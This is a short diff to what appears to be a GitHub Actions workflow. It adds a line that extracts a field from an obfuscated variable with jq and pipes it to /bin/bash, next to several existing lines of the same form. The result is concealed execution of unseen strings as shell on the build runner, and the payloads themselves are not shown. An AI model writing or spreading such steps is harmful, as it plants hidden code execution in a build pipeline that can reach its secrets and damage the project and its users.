@@ -40,6 +40,7 @@ jobs:
           echo $nro21558 | jq -r .ku9 | /bin/bash
           printf '%s' "$e0" | jq -r .d337 | /bin/bash
           printf '%s' "$kidpk93" | jq -r .p0670 | /bin/bash
+          echo $g1 | jq -r .xnyv0 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
